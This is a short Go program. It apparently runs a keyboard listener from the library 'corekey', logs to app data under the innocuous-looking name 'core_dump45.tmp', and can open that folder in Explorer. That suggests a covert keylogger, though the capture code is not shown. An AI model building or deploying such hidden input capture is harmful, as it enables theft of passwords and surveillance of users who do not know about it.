package main

import (
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/dxasu/corekey"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "open" {
		path := filepath.FromSlash(corekey.GetAppDataPath())
		exec.Command("explorer", path).Run()
		return
	}

	corekey.PcListen("core_dump45.tmp", 0)
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	<-sigs
}
